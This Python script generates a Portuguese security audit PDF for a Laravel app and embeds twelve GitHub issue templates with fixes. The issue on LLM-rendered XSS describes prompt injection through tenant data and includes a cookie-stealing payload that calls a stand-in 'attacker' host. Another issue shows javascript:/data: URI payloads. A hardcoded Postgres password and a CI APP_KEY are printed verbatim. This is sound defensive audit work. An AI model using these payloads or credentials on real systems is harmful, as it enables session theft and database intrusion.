    sev_rank = {"critica": 0, "alta": 1, "media": 2, "baixa": 3, "informativa": 4}
    by_cat = {}
    for f in FINDINGS:
        by_cat.setdefault(f["cat"], []).append(f)
    for cat in by_cat:
        by_cat[cat].sort(key=lambda x: sev_rank[x["sev"]])

    for cat, items in by_cat.items():
        story.append(Paragraph(cat, h2))
        for f in items:
            block = []
            block.append(_severity_chip(f["sev"]))
            block.append(Spacer(1, 0.15*cm))
            block.append(Paragraph(f"<b>Arquivo:</b> <font face=\"Courier\">{esc(f['file'])}</font>", small))
            block.append(Paragraph(f"<b>Rota:</b> <font face=\"Courier\">{esc(f['route'])}</font>", small))
            block.append(Paragraph(f"<b>Descrição.</b> {esc(f['desc'])}", body))
            block.append(Paragraph(f"<b>Por que é explorável.</b> {esc(f['why'])}", body))
            block.append(Paragraph(f"<b>Correção sugerida.</b> {esc(f['fix'])}", body))
            block.append(Spacer(1, 0.25*cm))
            story.append(KeepTogether(block))
        story.append(Spacer(1, 0.2*cm))
    story.append(PageBreak())

    # ---------- RECOMENDAÇÕES ----------
    story.append(Paragraph("Recomendações Priorizadas", h1))
    rec_rows = [["Prioridade", "Ação", "Como executar"]]
    for pri, acao, exec_ in RECOMENDACOES:
        rec_rows.append([pri, Paragraph(esc(acao), small), Paragraph(esc(exec_), small)])
    rec_tbl = Table(rec_rows, colWidths=[2*cm, 6*cm, 8*cm], repeatRows=1)
    rec_tbl.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#0f172a")),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, 0), 9),
        ("ALIGN", (0, 0), (0, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("GRID", (0, 0), (-1, -1), 0.3, colors.HexColor("#cbd5e1")),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#f8fafc")]),
        ("FONTSIZE", (0, 1), (-1, -1), 8.5),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
    ]))
    # Colorir chip de prioridade
    for i, (pri, _, _) in enumerate(RECOMENDACOES, start=1):
        color_map = {"P1": PALETTE["critica"], "P2": PALETTE["alta"], "P3": PALETTE["media"], "P4": PALETTE["baixa"]}
        rec_tbl.setStyle(TableStyle([
            ("BACKGROUND", (0, i), (0, i), colors.HexColor(color_map.get(pri, "#64748b"))),
            ("TEXTCOLOR", (0, i), (0, i), colors.white),
            ("FONTNAME", (0, i), (0, i), "Helvetica-Bold"),
        ]))
    story.append(rec_tbl)
    story.append(PageBreak())

    # ---------- ISSUES GITHUB ----------
    story.append(Paragraph("Issues para o GitHub", h1))
    story.append(Paragraph("Templates prontos para copiar e colar em issues do repositório. Achados triviais foram agrupados.", small))
    story.append(Spacer(1, 0.3*cm))

    issues = _build_issues()
    for i, issue in enumerate(issues, start=1):
        block = [
            Paragraph(f"— ISSUE {i} —", h3),
            Preformatted(wrap_code(issue), mono),
            Paragraph(f"— FIM ISSUE {i} —", h3),
            Spacer(1, 0.35*cm),
        ]
        story.append(KeepTogether(block))

    doc.build(story, canvasmaker=VivensiCanvas)

    for temp in ["_chart_donut.png", "_chart_bars.png"]:
        p = HERE / temp
        if p.exists():
            p.unlink()

    return PDF


def _build_issues():
    """Retorna lista de strings Markdown, uma por issue (achados triviais agrupados)."""
    issues = []

    # ISSUE 1: TeamController (crítica, standalone)
    issues.append("""[Segurança] Privilege escalation em TeamController — user comum pode se promover a administrador

**Labels:** security, critical

## Problema
`TeamController@store/update/destroy` aceita o campo `role` do request e grava direto em `User::role` sem verificar o papel do caller. A rota `/ngo/team/*` roda apenas com middleware `auth+subscription`, sem gate por papel. A UI só aparece para role=`ngo` no sidebar (`layouts/app.blade.php:860`), mas o endpoint está aberto para qualquer usuário autenticado do tenant.

## Evidência
- `app/Http/Controllers/TeamController.php:31-83` — sem `authorize`, sem `abort_unless`, sem `Gate::`
- `routes/partials/ngo.php:29-32` — `Route::post('/ngo/team',...)`, `put`, `delete` sem `can:`
- Blade que esconde UI: `resources/views/layouts/app.blade.php:860` e `resources/views/ngo/team/index.blade.php:97-121`

## Impacto
Qualquer usuário autenticado do tenant (role=`common`, `employee`, `manager`) chama `POST /ngo/team` com `role=ngo` e cria um Administrador com Acesso Total. Via `PUT /ngo/team/{id}` pode promover a si mesmo. Compromete todo o modelo de papéis intra-tenant.

## Sugestão de correção
1. Definir gate `manage-team` em `AuthServiceProvider` aceitando apenas `role in [ngo, super_admin]`
2. Aplicar `middleware('can:manage-team')` nas 3 rotas em `routes/partials/ngo.php`
3. No controller, `abort_unless(in_array(auth()->user()->role, ['ngo','super_admin']), 403)` como defense-in-depth
4. Validar `role` do request contra whitelist do gate (não pode escalar acima do próprio)

## Critérios de aceite
- [ ] Gate `manage-team` registrado e testado
- [ ] Middleware aplicado nas rotas
- [ ] Teste PHPUnit/Pest cobrindo bloqueio de role=common tentando `POST /ngo/team`
- [ ] Teste cobrindo bloqueio de auto-promoção via `PUT`
- [ ] Regression suite passa 100%""")

    # ISSUE 2: Gates faltantes em controllers /ngo/* (HR, Transparency, SIC) — agrupado
    issues.append("""[Segurança] Gates ausentes em controllers /ngo/* de alta severidade (HR, Transparency, SIC)

**Labels:** security, high

## Problema
Três controllers do painel NGO fazem mutação sem gate por papel. UI escondida no sidebar (bloco `role=ngo` em `layouts/app.blade.php`), mas as rotas rodam apenas com `auth+subscription`. Qualquer user (`common`/`employee`/`manager`) do mesmo tenant executa as ações.

## Evidência
- `app/Http/Controllers/HumanResourcesController.php:94-215` (storeEmployee, updateEmployee, destroyEmployee, storeVolunteer, updateVolunteer, destroyVolunteer, logHours, toggleStatus) — rota `routes/partials/ngo.php:92-100`
- `app/Http/Controllers/TransparencyController.php` (updatePortal, addBoardMember, updateBoardMember, deleteBoardMember, addDocument, deleteDocument, addPartnership, updatePartnership, deletePartnership) — rota `routes/partials/ngo.php:230-239`
- `app/Http/Controllers/SicController.php` (respond, updateStatus) — rota `routes/partials/ngo.php:224-227`

Grep em `role|authorize|Gate::|abort_unless|hasRole` nos 3 arquivos retorna zero matches.

## Impacto
- **HR:** cria/apaga funcionários e voluntários com PII (CPF, PIS, salário), toggle status, emite certificados
- **Transparency:** altera portal público da ONG (conselho, docs, parcerias) — afeta site externo
- **SIC:** responde chamados LAI oficiais em nome da ONG sem trilha de autorização

## Sugestão de correção
Padrão: gates dedicados por módulo aceitando `role in [ngo, super_admin]` (ou incluir `manager` conforme regra do módulo):
```php
Gate::define('manage-hr',           fn($u) => in_array($u->role, ['ngo','super_admin']));
Gate::define('manage-transparency', fn($u) => in_array($u->role, ['ngo','super_admin']));
Gate::define('manage-sic',          fn($u) => in_array($u->role, ['ngo','super_admin']));
```
Aplicar `middleware('can:manage-<mod>')` nos grupos de rota correspondentes. Copiar padrão de `can:manage-grants` já existente em `routes/partials/ngo.php:61-78`.

## Critérios de aceite
- [ ] 3 gates definidos em `AuthServiceProvider`
- [ ] Middleware aplicado em cada grupo de rota
- [ ] Testes de regressão: role=common bloqueado (403) em cada handler mutador
- [ ] Suite verde""")

    # ISSUE 3: Gates faltantes em controllers /ngo/* média (Donor, Contract, Asset/Inv, Campaign/Budget/Receipt) — agrupado
    issues.append("""[Segurança] Gates ausentes em controllers /ngo/* de média severidade

**Labels:** security, medium

## Problema
Mesmo padrão da issue anterior, agora em controllers de risco médio dentro de `/ngo/*`.

## Evidência
- `app/Http/Controllers/NgoDonorController.php:45-140` (store/update/destroy/regenerateToken/sendPortalEmail) — `routes/partials/ngo.php:8-15`
- `app/Http/Controllers/ContractController.php` (store/regenerateLink/revokeLink) — `routes/partials/ngo.php:44-49`
- `app/Http/Controllers/AssetController.php` + `InventoryController.php` (store/update/destroy/movement) — `routes/partials/ngo.php:140-165`
- `CampaignController.php:24`, `BudgetController.php` (store), `ReceiptController.php` (regenerateLink/revokeLink)

## Impacto
- **Donors:** CRUD de PII (email/phone/address/document), regeneração de tokens de portal, disparo de email em nome da entidade
- **Contract:** emitir contratos digitais e revogar links públicos
- **Asset/Inventory:** patrimônio e almoxarifado da ONG
- **Campaign/Budget/Receipt:** captação, orçamento anual, links de recibos

## Sugestão de correção
Definir gates equivalentes (`manage-donors`, `manage-contracts`, `manage-assets`, `manage-campaigns`, `manage-budget`, `manage-receipts`) e aplicar `middleware('can:...')` nas rotas. Considerar gate genérico `ngo-admin` como base + gates finos por módulo.

## Critérios de aceite
- [ ] Gates definidos
- [ ] Rotas com middleware
- [ ] Testes de regressão bloqueando role=common em cada endpoint mutador
- [ ] Suite verde""")

    # ISSUE 4: prefix /personal/* sem role check
    issues.append("""[Segurança] Prefix /personal/* sem role check permite acesso de users NGO ao painel MEI

**Labels:** security, low

## Problema
`routes/partials/personal.php` roda todo o prefix `/personal/*` com apenas `middleware(['auth','subscription'])`. Users com role=`ngo`, `manager`, `employee` do mesmo tenant conseguem acessar/manipular clientes MEI e recibos NFS-e.

## Evidência
- `routes/partials/personal.php` — prefix declara `middleware(['auth','subscription'])`, sem role
- Controllers `Mei/MeiReceiptController.php`, `Mei/ClientController.php` — sem `abort_unless(role=common)`

## Impacto
Baixo — mesma organização. UI está escondida no menu, mas endpoint aberto. Fere segregação por painel.

## Sugestão de correção
Adicionar `middleware('role:common,super_admin')` no prefix. Confirmar previamente com o produto se algum tenant NGO usa MEI intra-org (memory sugere que common é o painel MEI/autônomo/PJ).

## Critérios de aceite
- [ ] Middleware aplicado
- [ ] Teste: role=ngo recebe 403 em `GET /personal`
- [ ] Sem regressão para tenants common""")

    # ISSUE 5: Senha Postgres hardcoded (crítico operacional, médio no repo)
    issues.append("""[Segurança] Rotacionar senha Postgres da Evolution e remover PGPASSWORD do repositório

**Labels:** security, medium

## Problema
`scripts/purge-vivensi-bot.sh:10` exporta `PGPASSWORD='evolution@2026'` inline. Script é commitado no repo.

## Evidência
```bash
export PGPASSWORD='evolution@2026'
```

## Impacto
Vazamento do repo ou clone em máquina comprometida → acesso direto ao Postgres da Evolution API (tabelas `Message` e `Chat` — dados sensíveis LGPD do WhatsApp). Depende de exposição de rede à Postgres (memory 2026-08-19 indica VPS separada `ip-172-26-10-197`).

## Sugestão de correção
1. Rotacionar senha no Postgres da Evolution
2. Mover credencial pra `/root/.pgpass` (chmod 600) ou `/etc/vivensi/purge.env` com `source` no início do script
3. Substituir a linha por leitura de env var externa
4. Manter o script no repo, mas sem a senha

## Critérios de aceite
- [ ] Nova senha rotacionada e testada
- [ ] Script atualizado sem PGPASSWORD hardcoded
- [ ] `.pgpass` ou `purge.env` criados no VPS com permissão 600
- [ ] Cron testado (log em `/var/log/vivensi-bot-purge.log`)
- [ ] Commit removendo credencial e mudança do script""")

    # ISSUE 6: XSS por prompt injection (chat_widget + 3 dashboards) — agrupado
    issues.append("""[Segurança] XSS via prompt injection em respostas de LLM (chat widget + dashboards insight)

**Labels:** security, medium

## Problema
Respostas do LLM (Bruce AI, DeepSeek/Gemini) são renderizadas via `innerHTML` sem DOMPurify, permitindo prompt injection reflexiva.

## Evidência
- `resources/views/partials/chat_widget.blade.php:192` — `div.innerHTML = marked.parse(text);`
- `resources/views/dashboards/ngo.blade.php:665` — `el.innerHTML = <p>${data.insight.replace(...)}</p>`
- `resources/views/dashboards/common.blade.php:619` — idem
- `resources/views/dashboards/manager.blade.php:576` — idem

Fonte de dados: `BruceAiService::dailyInsight()` chama LLM com dados do tenant (transações, projetos, beneficiários). Nome de projeto ou transação com payload malicioso é refletido.

## Impacto
Attacker cadastra beneficiário/projeto/transação com nome contendo `<img src=x onerror=fetch('//attacker/'+document.cookie)>`. Admin abre o dashboard, LLM devolve isso na resposta, `innerHTML` executa. Roubo de sessão de admin.

## Sugestão de correção
1. Copiar padrão de `resources/views/ngo/grants/show.blade.php:606`:
```html
<script src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
```
2. Trocar `innerHTML = marked.parse(text)` por `innerHTML = DOMPurify.sanitize(marked.parse(text))`
3. Nos 3 dashboards, escapar HTML antes do markdown-lite: `escapeHtml(data.insight).replace(/\\*\\*(.*?)\\*\\*/g, '<strong>$1</strong>').replace(/\\n/g, '<br>')`

## Critérios de aceite
- [ ] DOMPurify carregado nos 4 pontos
- [ ] `sanitize()` aplicado
- [ ] Teste manual: cadastrar beneficiário com nome malicioso e verificar que não executa
- [ ] Suite verde""")

    # ISSUE 7: XSS URL do Prospecting sem validação de scheme
    issues.append("""[Segurança] XSS via javascript:/data: URI em prospecting/index (URL controlada por terceiro)

**Labels:** security, medium

## Problema
Painel `/prospecting` renderiza `<a href="{{ $prospect->website }}">` com URL vinda da API Serper (Google Maps Places). Dono do perfil no Google Maps controla o campo `website` da listagem. Sem validação de scheme.

## Evidência
- `resources/views/prospecting/index.blade.php:403` — `<a href="{{ $prospect->website }}" target="_blank">`
- `app/Services/LeadSearchService.php:109` — `'website' => $item['website']` gravado direto

## Impacto
Cadastro de perfil com `website=javascript:alert(document.cookie)` ou `data:text/html,<script>...</script>`. Admin do painel clica → executa no contexto vivensi.app.br com cookies de sessão.

## Sugestão de correção
1. Em `LeadSearchService::persist()`, validar scheme antes de persistir:
```php
if (! Str::startsWith($item['website'] ?? '', ['http://', 'https://'])) {
    $item['website'] = null;
}
```
2. Alternativa (defense-in-depth): helper `safe_url()` na view que retorna `null` se scheme inválido, ou usa `Str::of($url)->startsWith(...)` no Blade.

## Critérios de aceite
- [ ] Validação de scheme aplicada em `LeadSearchService`
- [ ] Backfill: rodar update para limpar URLs existentes que já quebrem o padrão
- [ ] Teste: `LeadSearchService` recebe `website=javascript:...` e grava `null`""")

    # ISSUE 8: IDORs baixa (VolunteerCertificate + PublicRaffle + MeetingBooking) — agrupado
    issues.append("""[Segurança] IDORs de baixa severidade — padronizar HMAC bidx e tenant check

**Labels:** security, low

## Problema
Três handlers ainda dependem de convenção fraca (ID sequencial + campo não-secreto ou token plaintext).

## Evidência
1. `app/Http/Controllers/HumanResourcesController.php:452-509` (`downloadVolunteerCertificate`) — `VolunteerCertificate::findOrFail($id)` sem tenant filter; model não tem BelongsToTenant
2. `app/Http/Controllers/PublicRaffleController.php:136-165` (`uploadReceipt`) — guarda apenas por `buyer_email` (não-secreto)
3. `app/Http/Controllers/MeetingBookingController.php:72-81` — `where('confirmation_token', $token)` sem HMAC nem `hash_equals`; token gravado plaintext no DB

## Impacto
- **VolunteerCertificate:** cross-tenant improvável mas possível se cert.volunteer_id colidir com voluntário existente no tenant do atacante
- **PublicRaffle:** attacker que descubra email do comprador sobrepõe comprovante (2MB upload). Enumeração de ticketIds sequenciais
- **MeetingBooking:** vazamento de DB permite cancelar reuniões pendentes

## Sugestão de correção
1. `VolunteerCertificate`: adicionar coluna `tenant_id` + trait `BelongsToTenant`. Migration + backfill.
2. `PublicRaffle::uploadReceipt`: trocar `id + email` por token opaco (Str::random(40) + HMAC bidx). Coluna `receipt_token_bidx`. Comparação com `hash_equals`.
3. `MeetingBooking`: gravar `token_bidx = hash_hmac('sha256', $raw, config('app.key'))`. `where('token_bidx', $bidx)` + `hash_equals` no controller. Backfill dos existentes.

## Critérios de aceite
- [ ] 3 migrations aplicadas
- [ ] Backfill idempotente para tokens antigos
- [ ] Testes cobrindo cross-tenant, enumeração e token forjado bloqueados
- [ ] Suite verde""")

    # ISSUE 9: Charts JSON hex flags no conformidade
    issues.append("""[Segurança] Uniformizar flags JSON_HEX_* em ngo/conformidade/dashboard.blade.php

**Labels:** security, low, refactor

## Problema
Inconsistência: `resources/views/ngo/conformidade/dashboard.blade.php:307-308` usa `{!! $chartLabels !!}` e `{!! $chartData !!}` sem as flags `JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT` que outras views (ngo, common, manager, admin, smart_analysis, booking) usam consistentemente.

## Evidência
```php
$chartLabels = $chartSnaps->map(fn($s) => Carbon::parse(...)->format('d/m'))->toJson();
$chartData   = $chartSnaps->map(fn($s) => (float)$s->indice_geral)->toJson();
```
```html
const labels = {!! $chartLabels !!};
const data   = {!! $chartData !!};
```

## Impacto
Não explorável hoje — server formata `format('d/m')` e cast `(float)`. Mas quebra se alguém trocar por label vindo do banco.

## Sugestão de correção
```php
->toJson(JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT)
```

## Critérios de aceite
- [ ] Flags aplicadas nos 2 pontos
- [ ] Diff visual: dashboard segue renderizando idêntico""")

    # ISSUE 10: LandingPageController updateOrder dead code
    issues.append("""[Segurança] Método órfão LandingPageController::updateOrder — dívida latente de IDOR

**Labels:** security, informational, dead-code

## Problema
`app/Http/Controllers/LandingPageController.php:426-432` (`updateOrder`) itera `LandingPageSection::where('id',...)->update(...)` sem tenant check. Método não está roteado — `grep updateOrder routes/` retorna zero.

## Impacto
Não explorável hoje. Se algum dia for roteado sem revisar, vira IDOR clássico (reordena seções de landings de qualquer tenant).

## Sugestão de correção
Deletar o método OU adicionar tenant filter:
```php
LandingPageSection::whereHas('landingPage', fn($q) => $q->where('tenant_id', auth()->user()->tenant_id))
    ->whereIn('id', collect($request->order)->pluck('id'))
    ->each(fn($s) => $s->update([...]));
```

## Critérios de aceite
- [ ] Método removido OU defendido com tenant filter
- [ ] Se removido, confirmar grep zero references""")

    # ISSUE 11: Boas práticas CI/Docker (baixa)
    issues.append("""[Segurança] Boas práticas — APP_KEY do CI e defaults do docker-compose

**Labels:** security, low, best-practice

## Problema (agrupado)

### (a) APP_KEY fixa no workflow do CI
`.github/workflows/laravel.yml:57` — `APP_KEY: base64:kZ1GflhBe1nqNVSJNDZ9FWJMFG7rJ1XLuMoFBJFWjXc=` é usada apenas no job Pest. Já está no allowlist do gitleaks. Não é a APP_KEY de produção.

### (b) Defaults triviais no docker-compose
`docker-compose.yml:18,35,38` — `${DB_PASSWORD:-secret}`, `${MYSQL_ROOT_PASSWORD:-rootsecret}`. Compose não é usado em prod (VPS Lightsail com XAMPP/nginx).

## Impacto
Nenhum imediato. Boas práticas de higiene.

## Sugestão de correção
(a) Substituir por `APP_KEY: ${{ secrets.CI_APP_KEY }}` e cadastrar o secret no repo GitHub.
(b) Trocar defaults por required: `${DB_PASSWORD:?DB_PASSWORD required}`.

## Critérios de aceite
- [ ] Secret CI_APP_KEY cadastrado
- [ ] Workflow atualizado
- [ ] docker-compose falha explicitamente se env ausente""")

    # ISSUE 12: CSP unsafe-inline (informativo, roadmap)
    issues.append("""[Segurança] Roadmap — retirar 'unsafe-inline' da CSP e adotar nonces

**Labels:** security, informational, roadmap

## Problema
`app/Http/Middleware/SecurityHeaders.php:54` — CSP existe (bom!) com `object-src 'none'`, `frame-ancestors 'self'`, `base-uri 'self'`, `form-action 'self'`. Mas `script-src 'self' ... 'unsafe-inline'` e `style-src 'self' ... 'unsafe-inline'` anulam o principal ganho anti-XSS.

## Impacto
CSP hoje é defesa em profundidade parcial. Sem `unsafe-inline`, os 3 achados de XSS por prompt injection não teriam impacto de execução de script.

## Sugestão de correção (roadmap, alto esforço)
1. Gerar nonce por request no middleware: `$nonce = base64_encode(random_bytes(16));` — compartilhar via View::share ou request attribute
2. Aplicar em cada `<script>` inline: `<script nonce="{{ csp_nonce() }}">`
3. Migrar Alpine, chart.js, tags de insights, blade partials
4. Trocar CSP para `script-src 'self' 'nonce-{$nonce}' <cdns>`
5. Remover `'unsafe-inline'` de script e style
6. Report-Only por 1-2 semanas antes de enforce

## Critérios de aceite
- [ ] Nonce middleware implementado
- [ ] Views principais migradas (admin, ngo, common, manager, whatsapp, blog)
- [ ] Modo Report-Only validado sem violations
- [ ] `unsafe-inline` removido de script-src e style-src""")

    return issues


if __name__ == "__main__":
    out = build()
    print(f"PDF gerado: {out}")
    print(f"Tamanho:    {out.stat().st_size / 1024:.1f} KB")
